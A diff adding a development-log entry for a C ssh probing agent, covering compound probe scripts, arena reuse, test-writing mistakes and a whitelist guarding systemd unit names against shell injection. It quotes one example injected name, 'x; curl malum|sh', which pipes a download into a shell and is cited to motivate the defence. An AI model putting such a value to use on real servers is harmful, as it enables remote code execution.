@@ -280,3 +280,89 @@ fixed in the later pass: `destinationes` now counts them.
   `--plain` suppresses them and the fixture was captured with it.
   If that flag is ever dropped, the first column silently becomes
   the marker. The flag requirement is in the header.
+
+## 2026-07-24 (V4a) — the agent: probe, act, record
+
+`include/villa_agens.h` + `lib/villa_agens.c` +
+`probationes/probatio_villa_agens.c` (100 assertions) + the stub ssh.
+Root suite 105 → **106**.
+
+### One ssh call, not five
+
+A probe gathers five readings. Five separate ssh calls would be five
+round trips and five spawns per cycle; one compound script with
+marked sections is one of each. Verified against the real droplet:
+**6 sections, all closed, exit 0, 503 lines in a single round trip.**
+
+Per-section exit codes matter more than they look. nginx can be
+broken while systemctl is fine — a single overall exit code would
+collapse "one reading failed" into "the probe failed," and §V pins
+that a failed nginx section leaves the other five intact.
+
+### The injection vector the local guarantee does NOT cover
+
+`processus` deletes shell quoting bugs **locally** — argv vector, no
+`/bin/sh`. That protects this machine and says nothing about the
+remote one, because ssh runs its command through the *login shell*
+by definition.
+
+Mostly that's fine: the probe script is ours, and the free-text
+command box is *supposed* to reach the remote shell — that's the
+feature. But **unit names come from user-created entities and get
+interpolated into our script**. A `servitium` named
+`x; curl malum|sh` would run under cover of a routine probe.
+
+So `villa_unitas_valida` whitelists what systemd actually uses
+(alnum, `-`, `_`, `.`, `@`, `:` — enough for `getty@tty1.service`
+and `user@1000.service`) and rejects everything the shell reads.
+Rejected names are **omitted and counted**, so the caller can say
+"probed 4 of 5" rather than quietly probing less than asked.
+
+Proven end to end: feeding all three names through the real
+generator yields `omissa=1` and a script containing neither
+`x; curl` nor `|sh`.
+
+### Twin arenas per server
+
+Each server owns two arenas and alternates. A new probe fills arena
+A while the last snapshot still lives in arena B.
+
+Without this, starting a probe would free the snapshot the UI reads
+in that same tick — a use-after-reset that appears only under load
+and looks like "the panel goes blank sometimes." §VIII holds a
+pointer to the previous snapshot across a new probe start and
+asserts it still reads correctly. Arenas are cleared before reuse,
+so memory is flat however long villa runs.
+
+### Two test-authoring mistakes worth keeping
+
+**Asserting too broadly.** I wrote `CREDO_FALSUM(contains(script,
+";"))` to prove no injection. It failed — the script legitimately
+contains semicolons in its *own* shell function
+(`s(){ ...; shift; ...; }`). The assertion accused the generator
+instead of testing the guard. Fixed by looking for the malicious
+name's own fragments.
+
+**Asserting against a summary instead of the record.** The `origo`
+check initially read the `res` tool's output, which doesn't render
+origo at all (it's a column on `tessellae`, not part of datum). The
+right assertion reads the **annals file** — that proves the event
+durably exists with correct provenance, rather than that some text
+appeared in a human-facing summary. It also let me add the
+complementary check that no `mutatio` event was ever written.
+
+### Also
+
+- `filum_directorium_creare_cum_modo` added — the existing helper
+  hardcodes 0755, wrong for a control-socket directory (0700). It
+  also *coerces* the mode on an existing directory, since one
+  created loosely elsewhere would otherwise stay loose silently.
+- The stub assembles its compound response **from the individual
+  fixtures**, so those stay the single source of truth and a
+  hand-maintained compound fixture can't drift from them.
+- The event gate spawns an ephemeral `tabulariumd` on `-portus 0`
+  with its own scrinium — Fran's real board is never touched
+  (verified: his daemon still running afterward).
+- Cleanup used three explicit filenames and left sqlite's `-wal`
+  and `-shm` behind. Now a glob. A gate that litters is a gate
+  someone eventually disables.
